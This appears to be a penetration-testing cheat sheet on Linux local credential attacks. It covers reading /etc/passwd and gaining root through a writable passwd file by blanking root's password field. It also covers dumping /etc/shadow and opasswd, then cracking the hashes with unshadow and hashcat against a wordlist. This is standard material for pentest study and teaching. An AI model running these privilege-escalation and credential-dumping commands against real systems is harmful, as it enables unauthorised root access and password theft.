## Local Credential Identification

Checking for inline hashes or mapping user accounts when local access is established.

Read the world-readable password file to identify users and shell environments

```
cat /etc/passwd
```

- **World-writable** `/etc/passwd` file or `/etc` directory
    
- **Root** account with an empty password field
    
- **MD5** (ID 1) hashes present in legacy configurations or `opasswd`
    
- **Password hash in passwd**: If the second field contains a hash instead of `x`, the account is vulnerable to direct cracking without shadow access.
    
- **Empty password field**: If the second field is empty, the system may allow login without a password prompt.
    

---

## Writable passwd Escalation

The `/etc/passwd` file is writable due to administrative misconfiguration, allowing direct modification of user attributes.

Remove the root password requirement by clearing the second field in the entry

```
root::0:0:root:/root:/bin/bash
```

- **Write permissions** on the `/etc` directory inherited by inexperienced administrators.
- **Write permissions** on `/etc/passwd` itself.

**Silent failure**: Certain programs may **deny access** to specific functions if the password field is left empty.

---

## Credential Extraction and Analysis

Administrative access is achieved and hashes are needed for cracking or pattern analysis.

Read the shadow file to obtain modern hashes for all users

```
cat /etc/shadow
```

View previous passwords to identify rotation patterns and weaker algorithms

```
cat /etc/security/opasswd
```

- **Algorithm Identification**: The ID value in the hash (e.g., `1` for **MD5**, `6` for **SHA-512**, `y` for **yescrypt**) dictates cracking speed and tool selection.
- **Account Locking**: Fields containing `!` or `*` indicate the user **cannot log in** via standard Unix password authentication.

**Insufficient privileges**: Accessing `/etc/shadow` or `/etc/security/opasswd` will **fail silently** or return a permission denied error without **root** or equivalent privileges.

---

## Credential Preparation and Cracking

Moving extracted passwd and shadow data into a format compatible with automated cracking tools.

Combine passwd and shadow files into a crackable format

```
unshadow <FILE_PATH>/passwd.bak <FILE_PATH>/shadow.bak > <FILE_PATH>/unshadowed.hashes
```

Execute a dictionary attack against unshadowed hashes using specific hash modes

```
hashcat -m 1800 -a 0 <FILE_PATH>/unshadowed.hashes <FILE_PATH>/rockyou.txt -o <FILE_PATH>/unshadowed.cracked
```

- John the Ripper
    - `unshadow <PASSWD> <SHADOW>`
    - Prefer for **single crack mode** to quickly test weak or predictable passwords.
- Hashcat
    - `hashcat -m <MODE> -a 0 <HASHES> <WORDLIST>`
    - Prefer for high-performance GPU-based cracking once a specific algorithm is identified.

**Invalid user**: If a user exists in `/etc/passwd` but has no corresponding entry in `/etc/shadow`, the user is **considered invalid** by the system.